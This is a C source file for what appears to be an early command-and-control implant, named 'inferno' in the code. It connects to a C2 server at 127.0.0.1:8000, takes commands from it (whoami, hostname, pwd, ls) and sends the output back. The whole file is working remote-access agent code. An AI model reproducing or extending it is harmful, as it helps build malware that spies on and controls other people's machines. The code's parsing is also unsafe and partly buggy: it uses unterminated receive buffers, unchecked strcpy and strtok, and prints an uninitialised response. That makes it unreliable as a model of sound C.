#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define IP "127.0.0.1"
#define PORT_HTTP 8000

//handle erros
void error(char *message) {
    fprintf(stderr, "%s: %s\n", message, strerror(errno));
    exit(EXIT_FAILURE);
}

char *executing(char *receive, char *arg);
char *whoamiCommand();
char *hostnameCommand();
char *pwdCommand();
char *lsCommand(char *path);

int main() {
    //socket http
    puts("Initializing socket...");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (inferno_socket == -1)
        error("Error initializing socket");

    //preparing http address
    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT_HTTP);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    //connect http
    puts("Connecting...");
    if (connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) == -1)
        error("Error connecting");
    puts("Connected");

    while (1) {
        //receiving http payload
        char receive[1024];
        if (recv(inferno_socket, receive, sizeof(receive), 0) == -1)
            error("Error receiving payload");
        printf("Receiving:\n\n%s\n\n", receive);

        //copying original payload
        char receive_copy[2048];
        strcpy(receive_copy, receive);
  
        //parsing to extract payload
        char *content_length = strstr(receive_copy, "{'payload':");
        content_length += strlen("{'payload':");
        char *command_start = strtok(content_length, "'");
        char *command = strtok(command_start, "'");

        //copying original payload
        char receive_copy2[2048];
        strcpy(receive_copy2, receive);

        //parsing to extract argument
        char *content_length_arg = strstr(receive_copy2, ",'argument':");
        char *arg;
        if (content_length_arg != NULL) {
            content_length_arg += strlen(",'argument':");
            char *arg_start = strtok(content_length_arg, "'");
            arg = strtok(arg_start, "'");
        }

        //sending payload result
        char response[1024];
        char *task;

        if (content_length_arg == NULL)
            task = executing(command, NULL);
        else
            task = executing(command, arg);

        printf("Sending: %s\n", response);
        sprintf(response, "%s\r\n", task);
        printf("Sending: '%s' from agent...\n", response);
        if (send(inferno_socket, response, sizeof(response), 0) == -1)
            error("Error sending payload result");
        printf("Sent:\n\n'%s' from agent...\n", response);
    }
    close(inferno_socket);
}

char *executing(char *receive, char *arg) {
    char *task;
    //execute whoami
    if (strcmp(receive, "whoami") == 0)
        task = whoamiCommand();
    else if (strcmp(receive, "hostname") == 0)
        task = hostnameCommand();
    else if (strcmp(receive, "pwd") == 0)
        task = pwdCommand();
    else if (strcmp(receive, "ls") == 0)
        task = lsCommand(arg);
    else
        task = "Not yet build";
    return task;
}

//whoami syscall
char *whoamiCommand() {
    char *username = getlogin();
    return username;
}

//hostname syscall
char *hostnameCommand() {
    static char hostname[2048];
    gethostname(hostname, 2048);
    return hostname;
}

//pwd syscall
char *pwdCommand() {
    static char directory[2048];
    getcwd(directory, 2048);
    return directory;
}

//ls syscall
char *lsCommand(char *path) {
    struct stat sb;
    static char error_message[1024];
    if (path == NULL)
        path = ".";
    char *buf = malloc(2048 * sizeof(char));
    DIR *dirp = opendir(path);
    if (dirp == NULL) {
        strerror_r(errno, error_message, sizeof(error_message));
        return error_message;
    }

    struct dirent *list;
    sprintf(buf, "Type\t\tSize\tName\n");
    sprintf(buf + strlen(buf), "====\t\t====\t====\n");
    while ((list = readdir(dirp)) != NULL) {
        char type[2048];
        char pathname[2048];
        sprintf(pathname, "%s/%s", path, list->d_name);
        lstat(pathname, &sb);
        switch (sb.st_mode & S_IFMT) {
           case S_IFBLK:  sprintf(type, "block device");            break;
           case S_IFCHR:  sprintf(type, "character device");        break;
           case S_IFDIR:  sprintf(type, "directory");               break;
           case S_IFIFO:  sprintf(type, "FIFO/pipe");               break;
           case S_IFLNK:  sprintf(type, "symlink");                 break;
           case S_IFREG:  sprintf(type, "regular file");            break;
           case S_IFSOCK: sprintf(type, "socket");                  break;
           default:       sprintf(type, "unknown?");                break;
        }
        sprintf(buf + strlen(buf), "%s\t%d\t%s\t\n", type, list->d_reclen, list->d_name);
    }
    return buf;
}
